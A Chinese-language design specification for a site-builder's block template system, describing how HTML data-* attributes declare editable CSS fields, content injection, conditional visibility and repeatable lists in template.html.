# Block data-* 字段声明系统

用 HTML `data-*` 属性替代 `meta.yaml` 声明 Block 的可配置字段。template.html 同时承担 Schema 和 Render 两个角色。

> **配套文档：** 实际迁移策略、逐 Block 分析、验证清单见 [block-data-attributes-dev-plan.md](block-data-attributes-dev-plan.md)。本文聚焦设计规范，开发方案聚焦实施路径。
## data-* 属性速查

### 一、元素标识

| 属性 | 值 | 必填 | 说明 |
|---|---|---|---|
| `data-key` | 合法 Python 标识符 | 见规则 | 元素标识符，作为其 CSS 字段的 key 前缀。有注入属性的元素**必填**，纯 CSS 字段元素可选 |

### 二、CSS 字段声明

| 属性 | 值 | 必填 | 说明 |
|---|---|---|---|
| `data-label` | 中文前缀 | 否* | **批量模式**：为 style 中所有 CSS 属性自动生成字段，标签 = 前缀 + CSS 中文名 |
| `data-label-<prop>` | 中文字符串 | 否* | **逐个模式**：为此 CSS 属性声明字段标签。*与 `data-label` 至少一个 |
| `data-skip-field` | CSS 属性名，`,` 分隔 | 否 | 排除指定属性不生成字段。仅配合 `data-label` 使用 |
| `data-group-<prop>` | 分组名 | 否 | 将此 CSS 字段归入指定折叠面板 |
| `data-placeholder` | 字符串 | 否 | **批量占位提示**：所有 CSS 字段共用 |
| `data-placeholder-<prop>` | 字符串 | 否 | 逐字段占位提示（覆盖批量设置） |
| `data-unit-<prop>` | 单位列表 `,` 分隔 | 否 | 覆盖单位推断（Phase 2，v1 不实现）。v1 使用现网自动推断逻辑（`un()` 函数），迁移时集成进 `renderField()` |

### 三、内容注入

| 属性 | 值 | 说明 |
|---|---|---|
| `data-content` | 字段 key | 替换元素全部文本内容（innerText） |
| `data-src` | 字段 key | 设置 `src` 属性（img / video / audio / source / iframe） |
| `data-href` | 字段 key | 设置 `href` 属性（a / link） |
| `data-bg` | 字段 key | 追加 `background-image: url(...)` 到 style |
| `data-attr-style` | 字段 key | 追加整段 CSS 字符串到 style 末尾（多属性联动） |
| `data-attr-<name>` | 字段 key | 设置任意 HTML 属性（如 `data-attr-target` 设置 `target` 属性） |

### 四、条件可见性

| 属性 | 值 | 说明 |
|---|---|---|
| `data-show-if` | 字段 key | 根据此字段的值判断元素显隐 |
| `data-show-if-value` | 值，`,` 分隔多值 | 字段值匹配时才显示。不写则字段非空即显示 |
| `data-show-if-default` | 无值（布尔属性） | 互斥组兜底项：无匹配时保留此元素。同组最多一个 |
| `data-hide-when-empty` | `"true"` / `"false"` | 覆盖空值自动隐藏行为（默认 `true`，极少需要设为 `false`） |

### 五、可重复列表

| 属性 | 值 | 必填 | 说明 |
|---|---|---|---|
| `data-repeat` | 列表字段 key | **是** | 声明此元素为可重复列表容器 |
| `data-repeat-item` | 无值（布尔属性） | **是** | 标记模板项（容器内只写一份，后处理克隆 N 份） |
| `data-repeat-label` | 中文字符串 | **是** | 列表的中文标签 |
| `data-repeat-group` | 分组名 | 否 | 列表在属性面板中的分组。默认等于 `data-repeat-label` |

### 六、响应式控制

| 属性 | 值 | 说明 |
|---|---|---|
| `data-no-resp` | 无值（布尔属性） | 标在根元素上，禁用响应式覆写控件（每行列数 / 每页数量） |

### 七、`<meta>` 字段声明

| 属性 | 值 | 必填 | 说明 |
|---|---|---|---|
| `data-field` | 字段 key | **是** | 非 CSS 字段的唯一标识 |
| `data-label` | 中文字符串 | **是** | 字段的中文标签 |
| `data-type` | 类型枚举 | **是** | 表单控件类型：`text` / `textarea` / `url` / `number` / `select` / `toggle` / `visibility` / `icon` |
| `data-default` | 字符串 | 否 | 默认值。不写则初始数据中无此 key |
| `data-group` | 分组名 | 否 | 归入指定折叠面板 |
| `data-placeholder` | 字符串 | 否 | 输入框占位提示（仅 text / url / textarea / number 类型生效） |
| `data-options` | `标签:值, 标签:值` | select 必填 | 下拉选项。值含 `:` 或 `,` 时用全角 `：` `，` 替代 |
| `data-source` | 数据路径 | 否 | 跨数据源引用（如 `settings.contact`）。延迟到最后迁移 |
| `data-readonly` | `"true"` / `"false"` | 否 | 标记字段只读 |

### 八、列表约束与排序

| 属性 | 值 | 必填 | 说明 |
|---|---|---|---|
| `data-repeat-min` | 数字 | 否 | 列表最少项数（默认 0，允许空列表） |
| `data-repeat-max` | 数字 | 否 | 列表最多项数（默认无限制） |
| `data-sortable` | 无值（布尔属性） | 否 | 列表项支持拖拽排序（Phase 2，v1 按添加顺序） |

### 九、模板 JS 钩子（渲染时属性，不被扫描器处理）

模板作者在 template.html 中写给内联 `<script>` 使用的属性，**不经后处理修改**，原样保留到最终输出。

| 属性 | 典型值 | 用途 | 使用位置 |
|---|---|---|---|
| `data-block-id` | `{{ block_id }}` | 分页 / 加载更多按钮标识 | data_grid |
| `data-page` | 数字 | 分页当前页码 | data_grid |
| `data-per-page` | 数字 | 每页显示数量 | data_grid |
| `data-total` | 数字 | 数据总条数 | data_grid |
| `data-index` | `{{ loop.index0 }}` | 轮播 slide 序号 | hero_banner |
| `data-slide` | `{{ loop.index0 }}` | 导航圆点对应的 slide 序号 | hero_banner |
| `data-full` | 图片 URL | 放大镜大图地址 | item_detail |
| `data-target` | 数字 | 计数动画目标值 | stat_counter |

> **注意：** 上表中的 Jinja2 变量（`{{ }}` / `{% %}`）在数据集绑定 Block 中仍需保留，因为这些 Block 尚未迁移到零 Jinja2 模式。非数据集 Block 的对应 JS 逻辑直接写静态值。

---

## 一、核心机制

### 1.1 一句话原则

- `data-key` 给元素起名
- `data-label`/`data-label-*` 声明可编辑的 CSS 字段
- `data-content`/`data-src`/`data-href`/`data-bg`/`data-attr-style` 声明内容注入
- `data-show-if` 声明条件可见性
- `data-repeat` 声明可重复列表
- `<meta data-field>` 声明其他非 CSS 字段。

系统扫描 template.html 自动生成后台表单，后处理完成列表展开、CSS 注入、内容注入、条件可见性、Schema 清理。

### 1.2 字段 key 的生成规则

每个可编辑字段需要一个**全局唯一的 key**（对应 `module.data.<key>` 或 `item.<key>`）。

| 场景 | key 生成方式 | 示例 |
|---|---|---|
| 元素有 `data-key` | `<data-key>_<css属性>`（中划线转下划线） | `data-key="title"` + `font-size` → `title_font_size` |
| 元素有 `data-key`，CSS 属性含中划线 | 中划线全部转下划线 | `data-key="btn"` + `background-color` → `btn_background_color` |
| 元素无 `data-key` | 直接用 CSS 属性名（中划线转下划线） | `data-label-height` → `height` |
| `<meta data-field>` | 直接用 `data-field` 的值（不做转换） | `data-field="overlay_enabled"` → `overlay_enabled` |
| `data-repeat-item` 内部 | 同上（自动归入列表项的 item_fields） | `data-field="title"` → 列表项属性 `title` |

**冲突检查**（扫描时执行，冲突则报错）：
1. section 级所有 key 必须唯一（含 CSS 字段和 `<meta>` 字段之间）
2. 同一 `data-repeat` 内的 item 级 key 必须唯一
3. 不同 `data-repeat` 之间的 item 级 key 允许重复

### 1.3 字段归属：section 级 vs. item 级

归属由 `data-repeat-item` 决定，和 `{% for %}` 循环无关：

- **`data-repeat-item` 外部**的字段 → section 级（存于 `module.data.<key>`）
- **`data-repeat-item` 内部**的字段 → item 级（存于列表中每项的 `<key>`）

**`data-repeat-item` 的 DOM 深度规则**：`data-repeat-item` 必须是 `data-repeat` 容器的**直接子元素**。模板只写一份 data-repeat-item（不含 `{% for %}`），`expand_repeat_items()` 根据数据数组长度自动克隆。

```
正确（模板仅写一份，expand_repeat_items() 克隆 N 份）：
<div data-repeat="slides">
  <div data-repeat-item> ... </div>
</div>

错误（中间有包裹元素）：
<div data-repeat="slides">
  <div class="wrapper">
    <div data-repeat-item> ... </div>   ← 不是直接子元素，扫描器报错
  </div>
</div>
```

### 1.4 字段值回退规则

构建时，字段值的采用优先级：

```
用户保存的值（非空字符串） > 模板 style 中的默认值 > 空字符串（不输出该 CSS 属性）
```

具体行为：
- 用户填了值 → 用用户的值
- 用户从未编辑过该字段（key 不在 `module.data` 中）→ 用模板默认值
- 用户**主动清空**了字段（key 存在但值为 `""`）→ 该 CSS 属性不出现在输出中（不是回退到默认值）

实现方式：不使用 `or` 操作符（它会将空字符串视为 falsy），改用显式的 `get` + 判断：

```python
value = module_data.get(field_key)
if value is None:
    value = field_default  # 从未编辑过，用默认值
# value 可能是 ""（用户主动清空），保留它
```

模板侧（item 级）用 Jinja2 `default` filter：
```jinja2
{{ item.title_font_size | default('3rem') }}
```
`default` filter 只在变量为 `None` 或 `undefined` 时回退，不会把空字符串误判。

---

## 二、属性语法规范

### 2.1 data-key —— 元素标识符

给元素命名，作为其 CSS 字段的 key 前缀。

```html
<h1 data-key="title"
    style="font-size: 3rem; color: #ffffff;"
    data-label-font-size="标题字号"
    data-label-color="标题颜色">
```

→ 生成两个字段：`title_font_size`、`title_color`

**规则：**
- 值必须是合法的 Python 标识符（`[a-zA-Z_][a-zA-Z0-9_]*`），不能数字开头
- 同一 template.html 内 section 级的 `data-key` 值必须唯一
- `data-repeat-item` 内部的 `data-key` 只在其所属的 repeat 容器内要求唯一（不同 repeat 容器之间可以重复）
- 可选：纯 CSS 字段（无注入属性）可不写 `data-key`，key 直接用 CSS 属性名（仅适合全模板唯一的属性）
- **有 `data-content` / `data-src` / `data-href` / `data-bg` / `data-attr-style` / `data-attr-*` 注入属性的元素，必须写 `data-key`**（后处理用它定位目标元素）

### 2.2 CSS 属性字段 —— `data-label-<css属性>`

标在已有内联 `style` 属性的 HTML 元素上，声明此 CSS 属性可编辑。

**核心规则：只有元素内联 `style` 属性中的 CSS 属性才会成为可编辑字段。** `<style>` 块、外部 CSS 文件中的样式被扫描器完全忽略，不产生任何编辑控件。店主后台的属性面板就是内联样式的映射——`style` 里写了几个属性，面板就显示几个字段。

```html
<!-- ✅ font-size 和 color 在 style 中 → 属性面板显示两个字段 -->
<h1 data-key="title"
    style="font-size: 3rem; color: #ffffff;"
    data-label-font-size="标题字号"
    data-label-color="标题颜色">

<!-- ❌ border 只在 <style> 块中，不在内联 style 中 → 属性面板不显示 -->
<style> h2 { border: solid 2px #f00; } </style>
<h2 data-key="subtitle" style="font-size: 18px; color: #fff;"></h2>
```

**属性列表：**

| 属性 | 必填 | 说明 |
|---|---|---|
| `data-label-<prop>` | 否* | 中文标签。有此属性才生成字段，没有则是固定样式。\*与 `data-label` 二选一，至少一个 |
| `data-label` | 否* | **批量声明**：值为中文前缀，扫描器自动为 style 中所有 CSS 属性生成字段，标签 = 前缀 + CSS 属性中文名（如 `data-label="卡片"` → "卡片上内边距""卡片圆角"等）。\*与 `data-label-*` 二选一，可共存（逐个声明覆盖自动生成） |
| `data-skip-field` | 否 | 排除某些 CSS 属性不生成字段。值为 CSS 属性名，多个用 `,` 分隔（如 `data-skip-field="border, box-shadow"`）。仅配合 `data-label` 使用 |
| `data-group-<prop>` | 否 | 分组名，同组属性归入同一折叠面板 |
| `data-placeholder-<prop>` | 否 | 输入框占位提示文字 |
| `data-placeholder` | 否 | **批量占位提示**：所有 CSS 字段共用此占位文字（如 `data-placeholder="如 4rem"`）。如果某个字段同时有 `data-placeholder-<prop>` → 逐字段声明优先 |

**`data-label` 自动生成规则：**

当元素有 `data-label="卡片"` 时，扫描器遍历该元素 `style` 中的所有 CSS 属性，从内置字典查找中文名，拼成标签：

```
style="padding: 2rem; border-radius: 12px;"
data-label="卡片"
       ↓ 扫描器自动生成
"padding"      → label="卡片内边距"
"border-radius" → label="卡片圆角"
```

**与 `data-label-*` 共存规则：**
- `data-label` 负责批量生成，`data-label-*` 负责逐个覆盖
- 同一个 CSS 属性同时被两者声明 → `data-label-*` 优先
- 示例：`data-label="卡片"` + `data-label-font-size="标题字号"` → `font-size` 用"标题字号"，其余用"卡片+中文名"

**`data-skip-field` 排除规则：**
- 值为 CSS 属性名，多个用 `,` 分隔
- 被排除的 CSS 属性不生成字段，也不参与冲突检查
- 示例：`data-label="卡片" data-skip-field="border, box-shadow"` → 所有 CSS 属性除 `border` 和 `box-shadow` 外均生成字段

**CSS 属性 → 中文名内置字典：**

| CSS 属性 | 中文名 |
|---|---|
| `padding` | 内边距 |
| `padding-top` / `padding-right` / `padding-bottom` / `padding-left` | 上/右/下/左内边距 |
| `margin` | 外边距 |
| `margin-top` / `margin-right` / `margin-bottom` / `margin-left` | 上/右/下/左外边距 |
| `font-size` | 字号 |
| `font-weight` | 字重 |
| `color` | 文字颜色 |
| `line-height` | 行高 |
| `letter-spacing` | 字距 |
| `text-align` | 文字对齐 |
| `background` | 背景 |
| `background-color` | 背景色 |
| `background-image` | 背景图 |
| `border` | 边框 |
| `border-radius` | 圆角 |
| `border-width` | 边框宽度 |
| `border-color` | 边框颜色 |
| `width` / `min-width` / `max-width` | 宽度 / 最小宽度 / 最大宽度 |
| `height` / `min-height` / `max-height` | 高度 / 最小高度 / 最大高度 |
| `display` | 显示方式 |
| `flex-direction` | 排列方向 |
| `gap` / `row-gap` / `column-gap` | 间距 / 行间距 / 列间距 |

字典中未覆盖的 CSS 属性 → 标签 = `data-label 值` + 属性名原文（如 `data-label="卡片"` + `aspect-ratio` → "卡片aspect-ratio"）。遇到此类情况不报错，仅输出 info 日志提示模板作者可改用 `data-label-*` 精确声明。

**从 style 提取默认值：**

扫描器解析元素的 `style` 属性字符串，以 `;` 分隔后按 `:` 拆分为属性名和值。

```
style="font-size: 3rem; color: #ffffff;"
       ↓ 解析
{"font-size": "3rem", "color": "#ffffff"}
       ↓ 匹配 data-label-*
"font-size" → default="3rem"
"color"     → default="#ffffff"
```

- CSS 属性名匹配**大小写不敏感**
- 如果 `data-label-*` 对应的 CSS 属性在 `style` 中**找不到** → 扫描器报错，输出明确信息：`元素 <h1 data-key="title"> 的 style 中缺少 CSS 属性 "font-size"（data-label-font-size 要求）`
- 值可以包含空格（如 `rgba(255, 255, 255, 0.9)`）
- 值**不支持包含 `;` 字符**（分号是 CSS 分隔符）。如果确实需要（极少见），用 `<meta data-type="text">` 代替

**CSS 属性 → 表单控件类型映射：**

| CSS 属性 | 输出 type | 对应 admin JS 控件 |
|---|---|---|
| `color` | `color` | 颜色选择器（复合控件：色盘 + 文本输入，`cn()` 等效） |
| `background-color` | `color` | 同上 |
| `border-color` | `color` | 同上 |
| `font-size` | `text` | 文本输入 |
| `font-weight` | `select` | 下拉（选项: normal, bold, 100~900 百位递增） |
| `line-height` | `text` | 文本输入 |
| `letter-spacing` | `text` | 文本输入 |
| `text-align` | `select` | 下拉（选项: left, center, right, justify） |
| `background-image` | `url` | URL 输入（配合图片预览） |
| `width`, `min-width`, `max-width` | `text` | 文本输入 |
| `height`, `min-height`, `max-height` | `text` | 文本输入 |
| `padding`, `padding-top`, `padding-right`, `padding-bottom`, `padding-left` | `text` | 文本输入 |
| `margin`, `margin-top`, `margin-right`, `margin-bottom`, `margin-left` | `text` | 文本输入 |
| `border-radius` | `text` | 文本输入 |
| `border-width` | `text` | 文本输入 |
| `background` | `text` | 文本输入（复合值整体作为一个字符串） |
| `display` | `select` | 下拉（选项: block, flex, grid, inline, inline-block, none） |
| `flex-direction` | `select` | 下拉（选项: row, row-reverse, column, column-reverse）。用于替换 `image_position`（highlight_card）、`layout`（contact_form）等布局变体的 Jinja2 `{% if %}`。需配合 `<meta data-type="select">` 覆盖选项标签（如 row=图左文右, row-reverse=文左图右） |
| 其他任意 CSS 属性 | `text` | 文本输入（兜底） |

**重要：** CSS 简写属性（如 `padding`）和其子属性（如 `padding-top`）是**独立字段**。声明了 `data-label-padding` 又声明 `data-label-padding-top` → 生成两个独立字段 `padding` 和 `padding_top`，互不干扰。模板作者自行保证不同时声明以避免混淆。

### 2.3 非 CSS 字段 —— `<meta data-field>`

用 `<meta>` 标签声明 CSS 无法表达的字段（URL、开关、下拉、文本内容）。`<meta>` 标签不参与页面渲染，构建时自动从输出中移除。

```html
<meta data-field="overlay_enabled"
      data-label="启用遮罩"
      data-type="select"
      data-options="启用:true, 不启用:false"
      data-default="true"
      data-group="遮罩层">
```

**属性列表：**

| 属性 | 必填 | 说明 |
|---|---|---|
| `data-field` | **是** | 字段 key |
| `data-label` | **是** | 中文标签 |
| `data-type` | **是** | 表单控件类型（见下表） |
| `data-default` | 否 | 默认值。不写则 key 不在初始数据中出现 |
| `data-group` | 否 | 分组名 |
| `data-placeholder` | 否 | 占位提示（仅 text / url / textarea / number 类型生效） |
| `data-options` | select 必填 | 格式见下方说明 |

**data-type 枚举及输出 type：**

| data-type | 输出 type | 表单控件 | 说明 |
|---|---|---|---|
| `text` | `text` | 单行文本输入 | |
| `textarea` | `textarea` | 多行文本输入 | |
| `url` | `url` | URL 输入 | |
| `number` | `number` | 数字输入 | |
| `select` | `select` | 下拉选择 | 必须配合 `data-options` |
| `toggle` | `select` | 下拉选择（true/false） | 输出为 select，与现有 admin JS 兼容 |
| `visibility` | `visibility` | 眼球开关按钮 | 用于控制页面元素的显隐（如"显示电话""显示邮箱"）。生成 visToggle 眼球图标 UI，值存储为 `"true"` / `"false"` |
| `icon` | `icon` | 图标选择器 | 下拉式图标列表，从预定义的 SVG 图标集中选择。用于 feature_grid、stat_counter、process_steps 等 Block 的图标字段 |

**data-options 格式：**

```
data-options="显示文字1:值1, 显示文字2:值2"
```

- 每项格式：`显示文字:值`
- 项之间用 `, ` 分隔（逗号+一个空格）
- 标签和值中**不能包含 `:` 或 `, ` 字符**。如确实需要，用 Unicode 全角替代：`：`（U+FF1A）和 `，`（U+FF0C），扫描器自动还原
- 示例：`data-options="居中:center, 居左:left, 居右:right"` → 输出 `[{"label": "居中", "value": "center"}, ...]`

**`<meta>` 标签放置规则：**

- Section 级：放在 `<section>` 等根元素**之后**，`{% endif %}` 之前
- Item 级：放在 `data-repeat-item` 元素内部的**末尾**（所有可见 HTML 之后）
- 扫描器仅根据 DOM 位置（是否在 `data-repeat-item` 内）判断归属，`<meta>` 在 HTML 树中的具体顺序不影响字段排序

#### 2.3.1 替代方案（不推荐）：不用 `<meta>`，字段属性挂在引用元素上

将 `<meta>` 上的 `data-type`、`data-label`、`data-options`、`data-default` 等信息直接写到引用该字段的元素上：

```html
<!-- 方案 A（推荐）：<meta> 集中声明 -->
<meta data-field="type" data-label="媒体类型" data-type="select"
      data-options="图片:image, 视频:video" data-default="image">

<video data-show-if="type" data-show-if-value="video"
       data-key="video" data-src="media" ...></video>
<div data-show-if="type" data-show-if-value="image"
     data-key="image" data-bg="media"></div>
```

```html
<!-- 方案 B（不推荐）：字段属性挂在首个引用元素上 -->
<video data-show-if="type" data-show-if-value="video"
       data-field-type="select"
       data-field-label="媒体类型"
       data-field-options="图片:image, 视频:video"
       data-field-default="image"
       data-key="video" data-src="media" ...></video>
<div data-show-if="type" data-show-if-value="image"
     data-key="image" data-bg="media"></div>
```

| 对比 | 方案 A `<meta>` | 方案 B 挂在元素上 |
|---|---|---|
| 字段声明位置 | 集中在 `<meta>` 区域 | 散落在各引用元素上 |
| 多元素引用同字段 | 声明一次即可 | 需选一个"主元素"承载声明，其余只引用，容易遗漏 |
| 扫描器实现 | 直接解析 `<meta>` | 需从引用处反向提取字段定义 |
| 可读性 | 字段列表一目了然 | 混在业务元素中，不易找全 |
| 构建输出 | `<meta>` 自动删除 | 额外的 `data-field-*` 属性需 strip（与注入属性混在一起，strip 正则更复杂） |

**结论：** 方案 B 可行但不推荐。`<meta>` 更符合"Schema 与 Render 分离（但同文件）"的设计意图——字段定义集中在 `meta` 区域，注入引用在元素上，职责清晰。开发时保留方案 B 为备选，如果后续发现某些场景 `<meta>` 确实多余再切换。

### 2.4 内容注入属性 —— `data-content` / `data-src` / `data-href` / `data-bg`

直接在 HTML 元素上声明内容来源，替代 Jinja2 `{{ }}` 变量输出。后处理阶段根据字段值注入实际内容。

| 属性 | 作用 | 替代的 Jinja2 | 示例 |
|---|---|---|---|
| `data-content="key"` | 元素的文本内容来自字段 key | `{{ item.title }}` | `<h1 data-content="title">默认标题</h1>` |
| `data-src="key"` | src 属性来自字段 key | `src="{{ item.media }}"` | `<img data-src="media" alt="">` |
| `data-href="key"` | href 属性来自字段 key | `href="{{ item.link }}"` | `<a data-href="primaryBtnLink">按钮</a>` |
| `data-bg="key"` | 背景图片 URL 来自字段 key | `style="background-image: url('...')"` | `<div data-bg="media">` |
| `data-attr-style="key"` | 整段 CSS 字符串来自字段 key | 一个 select 控制多个 CSS 属性（banner_align、card_layout 等） | `<div data-attr-style="content_position">` |
| `data-attr-<attrName>="key"` | 任意 HTML 属性值来自字段 key | `target="{{ item.linkTarget }}"` | `<a data-attr-target="primaryBtnLinkTarget">` |

**通用规则：**
- 元素的文本/属性内容作为**占位/默认值**，后处理用字段实际值覆盖
- 字段值为**空时，元素自动隐藏**（添加 `hidden` 属性）——详见 §2.5
- 字段 key 的查找规则与 CSS 字段相同：section 级从 `module.data` 取，item 级从对应 item 取

**`data-content` 细节：**
- 替换元素的全部文本内容（innerText），包括子文本节点
- 扫描器从 `data-content` 的属性值**自动推断字段存在**（不需要配套 `<meta data-field>`），字段 type 默认为 `text`
- 如果需要显式指定字段类型（如 `textarea`），搭配 `<meta data-field>` 一起声明

**`data-src` 细节：**
- 设置 `<img>` / `<video>` / `<audio>` / `<source>` / `<iframe>` 的 `src` 属性
- 自动推断字段 type = `url`
- 值为空时元素自动隐藏

**`data-href` 细节：**
- 设置 `<a>` / `<link>` 的 `href` 属性
- 自动推断字段 type = `url`
- 值为空时元素自动隐藏
- 如果元素同时有 `data-content` 和 `data-href`（如按钮），文字和链接分别注入

**`data-bg` 细节：**
- 在元素 style 中追加 `background-image: url(<value>);`
- 自动推断字段 type = `url`
- 值为空时元素自动隐藏
- 如果元素同时有内联 CSS 字段（`data-label-*`），`data-bg` 的注入与 CSS 字段注入互不干扰

**`data-attr-style` 细节：**
- 将字段值作为整段 CSS 字符串追加到元素的 `style` 属性末尾
- 自动推断字段 type = `text`（实际使用时搭配 `<meta data-type="select">` 声明选项）
- 字段值为空时不追加
- CSS 级联覆盖生效：追加的值在 style 末尾，浏览器优先采用后面的值覆盖模板默认值
- 与单个 CSS 字段（`data-label-*`）的区别：`data-label-*` 每个属性一个独立字段，`data-attr-style` 一个字段包含整段 CSS（多属性联动场景）

**典型场景 —— banner_align（一个下拉控制 4 个 CSS 属性）：**

```html
<!-- template.html：完全消除 banner_align 的 Jinja2 -->
<div class="hero-banner-content"
     style="max-width: 900px; text-align: center;"
     data-key="content"
     data-label-max-width="内容区宽度"
     data-label-text-align="文字对齐"
     data-attr-style="content_position">
  ...标题、按钮...
</div>

<!-- <meta> 声明：用全角 ： ， 转义 options 中的冒号和逗号 -->
<meta data-field="content_position" data-label="内容排版" data-type="select"
      data-options="居中:left： 50%; transform： translate(-50%, -50%);, 居左:left： 5%; transform： translateY(-50%);, 居右:left： auto; right： 5%; transform： translateY(-50%);"
      data-default="居中">
```

**与 `data-label-*` 的共存规则：**
- 同一元素可以既有 `data-label-*`（独立 CSS 字段）又有 `data-attr-style`（整段 CSS）
- `inject_content()` 先处理 `data-attr-style`，`inject_styles()` 后处理 `data-label-*`——后注入的 CSS 属性在 style 更靠后，级联优先级更高
- 如果 `data-attr-style` 注入的 CSS 和 `data-label-*` 注入的 CSS 有同名属性冲突，以 `data-label-*` 为准（因为它后注入）

**`data-attr-<attrName>` 细节：**
- 将字段值设置为元素的指定 HTML 属性
- 格式：`data-attr-<attrName>="fieldKey"`，如 `data-attr-target="linkTarget` → 设置 `target` 属性值
- 自动推断字段 type = `text`
- 字段值为空时不设置该属性（元素上不出现此 HTML 属性）

**与 `<meta data-field>` 的关系：**
- `<meta data-field>` **声明**字段（告诉扫描器有哪些字段），控制后台表单生成
- `data-content` / `data-src` / `data-href` / `data-bg` **引用**字段（告诉后处理值注入到哪里）
- 同一字段可以同时在 `<meta>` 中声明、在元素上引用，也可以只在元素上引用（扫描器从注入属性自动推断字段类型和存在）
- 注入属性中引用的 key 必须与 `<meta data-field>` 中的 `data-field` 值一致

### 2.5 条件可见性 —— 空值自动隐藏 + `data-show-if`

替代 Jinja2 `{% if %}` 条件渲染，让元素根据字段值自动显示/隐藏。

#### 2.5.1 空值自动隐藏

元素带有以下任一属性时，对应字段值为空 → 后处理自动给该元素添加 `hidden` 属性：

- `data-content`
- `data-src`
- `data-href`
- `data-bg`

```html
<!-- subtitle 有值时：正常渲染 <p class="...">关于我们</p> -->
<!-- subtitle 为空时：变成 <p class="..." hidden>副标题占位</p> -->
<p class="hero-banner-subtitle"
   style="font-size: 1.25rem;"
   data-key="subtitle"
   data-content="subtitle"
   data-label-font-size="副标题字号">副标题占位文本</p>
```

**不自动隐藏：** 如果元素不应因字段为空而隐藏（极少见），添加 `data-hide-when-empty="false"`。

#### 2.5.2 显式条件 —— `data-show-if`

用于根据字段值判断显示/隐藏（替代 `{% if item.type == 'video' %}`）：

```html
<!-- 当 type 值为 "video" 时显示，否则隐藏 -->
<video data-show-if="type" data-show-if-value="video"
       data-key="video" data-src="media"
       autoplay muted loop playsinline></video>

<!-- 当 type 值为 "image" 时显示，否则隐藏 -->
<div class="hero-banner-image"
     data-show-if="type" data-show-if-value="image"
     data-key="image" data-bg="media"></div>
```

| 属性 | 说明 |
|---|---|
| `data-show-if="key"` | 根据字段 key 的值判断是否显示 |
| `data-show-if-value="xxx"` | 字段值等于 xxx 时显示。不写则字段非空即显示 |

**多值匹配：** 用 `,` 分隔：
```html
<!-- type 为 "image" 或 "video" 时显示 -->
<div data-show-if="type" data-show-if-value="image,video" ...>
```

**互斥组 + 默认项 —— `data-show-if-default`：**

同一父元素下，多个 `data-show-if` 引用同名字段时构成**互斥组**——后处理只保留匹配的那一个，其余删除。这对替代 `{% if %}` / `{% elif %}` / `{% else %}` 链：

```html
<!-- 图标互斥组：根据 icon 字段值只保留一个 SVG -->
<div class="service-icon" data-key="icon" style="...">
  <svg data-show-if="icon" data-show-if-value="circuit">...</svg>
  <svg data-show-if="icon" data-show-if-value="code">...</svg>
  <svg data-show-if="icon" data-show-if-value="shield">...</svg>
  ...
  <svg data-show-if="icon" data-show-if-default>...</svg>  <!-- 兜底：没有匹配值时保留 -->
</div>
```

| 属性 | 说明 |
|---|---|
| `data-show-if-default` | 布尔属性（无值）。互斥组内没有匹配项时，标记此属性的元素被保留。同组最多一个元素可标记 |

**互斥组判定规则：**
- 同一父元素下，`data-show-if` 值相同的所有元素构成一个互斥组
- 匹配逻辑：遍历组内元素，找到 `data-show-if-value` 匹配当前字段值的 → 保留该元素，删除组内其余元素
- 兜底逻辑：如果没有匹配的元素，找 `data-show-if-default` → 保留它，删除其余；如果没有 `data-show-if-default`，全部删除
- 删除 = 从 HTML 中移除该元素（不是 `hidden`），输出中不留痕迹

**section 级条件：** `data-show-if` 也可用于 section 级元素，从 `module.data` 取值：

```html
<!-- overlay_enabled 值为 "true" 时显示遮罩层 -->
<div class="hero-banner-overlay"
     data-show-if="overlay_enabled"
     data-show-if-value="true"></div>
```

替代原来的：
```jinja2
{% if module.data.overlay_enabled != 'false' %}
<div class="hero-banner-overlay"></div>
{% endif %}
```

#### 2.5.3 与 Jinja2 `{% if %}` 的取舍

| 场景 | 推荐方式 | 原因 |
|---|---|---|
| 字段值决定元素显隐 | `data-show-if` / 自动隐藏 | 模板纯净，不需 Jinja2 |
| 字段值控制多个 CSS 属性（如 `banner_align`、`card_layout`） | `data-attr-style` + `<meta data-type="select">` | 一个字段含整段 CSS，追加到 style 末尾 |
| 列表循环 + 空列表守护 | `data-repeat` + `expand_repeat_items()` | 后处理替代 `{% for %}` 和 `{% if items %}`，详见 §4.4.0 |

### 2.6 可重复列表 —— `data-repeat` + `data-repeat-item`

容器标记 `data-repeat`，模板项标记 `data-repeat-item`。`data-repeat-item` 内部的字段自动成为列表项的属性。**模板只写一份 data-repeat-item**，`expand_repeat_items()` 后处理函数根据数据数组的长度自动克隆 N 份，替代 Jinja2 `{% for %}` 循环和 `{% if items %}` 空列表守护。

```html
<div data-key="slides"
     data-repeat="slides"
     data-repeat-label="轮播媒体项"
     data-repeat-group="轮播内容">
  <div data-repeat-item>
    <div data-key="media_bg"
         style="background-image: url('');"
         data-label-background-image="媒体图片"></div>
    <meta data-field="type" data-label="媒体类型" data-type="select"
          data-options="图片:image, 视频:video" data-default="image">
    <meta data-field="media" data-label="媒体地址" data-type="url">
    <meta data-field="title" data-label="主标题" data-type="text">
  </div>
</div>
```

→ 生成一个列表字段 `slides`，每项的 `item_fields` 包含：`media_bg_background_image`、`type`、`media`、`title`

**规则：**
- `data-repeat` 值 = 列表字段 key（如 `slides` → `module.data.slides`）
- `data-repeat-label` = 列表的中文标签（必填）
- `data-repeat-group` = 分组名（可选，不写则默认等于 `data-repeat-label`）
- `data-repeat-item` 必须是 `data-repeat` 容器的直接子元素（见 1.3 的 DOM 深度规则）
- `data-repeat-item` 只能有一层（列表字段不支持嵌套子列表）
- `data-repeat-item` 内部的 `data-key` 命名空间独立，不会和 section 级或其他 repeat 容器冲突
- `<meta>` 标签在构建输出中自动移除

**多列表支持：** 一个 template.html 可以包含多个 `data-repeat` 容器（如 item_detail 同时有 images 列表和 specs 列表）。每个 `data-repeat` 有独立的 `data-repeat-item` 和字段命名空间，扫描器通过 `data-repeat` 的值（listKey）区分它们。同一 template 内不同 `data-repeat` 的值必须唯一。

### 2.7 响应式控件声明 —— `data-no-resp`

部分 Block（如 hero_banner 轮播）虽有列表但不适合展示"每行列数""每页数量"等响应式网格控件。在根元素上声明 `data-no-resp` 即可禁用：

```html
<section data-no-resp ...>
```

**自动检测规则：**

```
模板中存在 data-repeat 容器？
├── 是 → 根元素有 data-no-resp？
│        ├── 是 → 不显示响应式覆写控件
│        └── 否 → 显示响应式覆写控件（columns + items_per_page）
└── 否 → 不显示响应式覆写控件
```

需要 `data-no-resp` 的 Block：
- **hero_banner**：有 slides 列表但是轮播，不是网格
- **item_detail**：有 images / specs 两组列表但是详情页展示，不是网格

其余无 `data-repeat` 的 Block（section_title、text_content、highlight_card）自动不显示响应式控件，无需声明。contact_form 等有表单但无列表的 Block 同理。

